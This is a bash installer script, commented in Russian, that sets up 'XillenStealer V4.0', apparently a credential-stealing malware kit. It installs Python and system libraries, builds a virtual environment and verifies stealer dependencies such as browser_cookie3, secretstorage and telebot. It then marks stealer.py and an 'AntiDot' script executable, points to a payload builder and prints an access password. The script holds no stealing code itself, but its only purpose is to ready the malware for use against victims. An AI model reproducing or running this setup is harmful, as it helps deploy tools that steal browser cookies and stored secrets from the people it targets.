#!/bin/bash

# XillenStealer V4.0 - Universal Linux Installer
# Автор: @Bengamin_Button @XillenAdapter

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

echo -e "\033[1;34m🚀 XillenStealer V4.0 - Linux Installation Script\033[0m"
echo -e "\033[1;34m================================================\033[0m"

# Определяем дистрибутив
if command -v apt-get &>/dev/null; then
    DISTRO="ubuntu"
elif command -v pacman &>/dev/null; then
    DISTRO="arch"
elif command -v dnf &>/dev/null; then
    DISTRO="fedora"
elif command -v yum &>/dev/null; then
    DISTRO="centos"
else
    echo -e "\033[1;31m❌ Неподдерживаемый дистрибутив Linux\033[0m"
    exit 1
fi

echo -e "\033[1;32m✅ Обнаружен дистрибутив: $DISTRO\033[0m"

# Проверяем наличие Python3
if ! command -v python3 &>/dev/null; then
    echo -e "\033[1;33m📦 Установка Python3...\033[0m"
    case $DISTRO in
        "ubuntu")
            sudo apt-get update
            sudo apt-get install -y python3 python3-venv python3-pip python3-dev
            ;;
        "arch")
            sudo pacman -Sy --noconfirm python python-pip python-virtualenv
            ;;
        "fedora"|"centos")
            sudo dnf install -y python3 python3-virtualenv python3-pip python3-devel
            ;;
    esac
else
    echo -e "\033[1;32m✅ Python3 уже установлен\033[0m"
fi

# Проверяем версию Python
PYTHON_VERSION=$(python3 -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')")
echo -e "\033[1;32m✅ Версия Python: $PYTHON_VERSION\033[0m"

# Создаем виртуальное окружение
echo -e "\033[1;33m📦 Создание виртуального окружения...\033[0m"
rm -rf "$SCRIPT_DIR/venv"
python3 -m venv "$SCRIPT_DIR/venv" --clear
source "$SCRIPT_DIR/venv/bin/activate"

# Устанавливаем системные пакеты
echo -e "\033[1;33m📦 Установка системных зависимостей...\033[0m"
case $DISTRO in
    "ubuntu")
        sudo apt-get install -y python3-tk libxcb-xinerama0 libsecret-1-dev build-essential
        ;;
    "arch")
        sudo pacman -S --noconfirm tk libxinerama libsecret base-devel
        ;;
    "fedora"|"centos")
        sudo dnf install -y python3-tkinter libXinerama libsecret-devel gcc gcc-c++ make
        ;;
esac

# Обновляем pip
echo -e "\033[1;33m📦 Обновление pip...\033[0m"
"$SCRIPT_DIR/venv/bin/pip" install --upgrade pip

# Устанавливаем Python зависимости
echo -e "\033[1;33m📦 Установка Python зависимостей...\033[0m"
"$SCRIPT_DIR/venv/bin/pip" install -r requirements.txt

# Проверяем установку
echo -e "\033[1;33m🔍 Проверка установки...\033[0m"
"$SCRIPT_DIR/venv/bin/python3" -c "
try:
    import requests, psutil, PIL, pycryptodome, browser_cookie3, telebot
    import secretstorage, colorama, cryptography
    print('\033[1;32m✅ Все модули импортированы успешно!\033[0m')
except ImportError as e:
    print(f'\033[1;31m❌ Ошибка импорта: {e}\033[0m')
    exit(1)
"

# Даем права на выполнение
chmod +x "$SCRIPT_DIR/stealer.py" 2>/dev/null
chmod +x "$SCRIPT_DIR/XillenStealerAntiDot.py" 2>/dev/null

echo -e "\033[1;32m\n🎉 Установка завершена успешно!\033[0m"
echo -e "\033[1;33m\n📋 Что установлено:\033[0m"
echo -e "  ✅ Python3 с виртуальным окружением"
echo -e "  ✅ Все зависимости из requirements.txt"
echo -e "  ✅ Системные библиотеки"
echo -e "  ✅ Обновлен pip"
echo -e "\n🚀 Теперь можно запускать XillenStealer V4.0!"
echo -e "\n💡 Для запуска Electron билдера:"
echo -e "   cd electron_builder"
echo -e "   npm install"
echo -e "   npm start"
echo -e "\n🔑 Пароль для входа: @xillenadapter"
echo -e "\n📖 Для активации виртуального окружения:"
echo -e "   source \"$SCRIPT_DIR/venv/bin/activate\""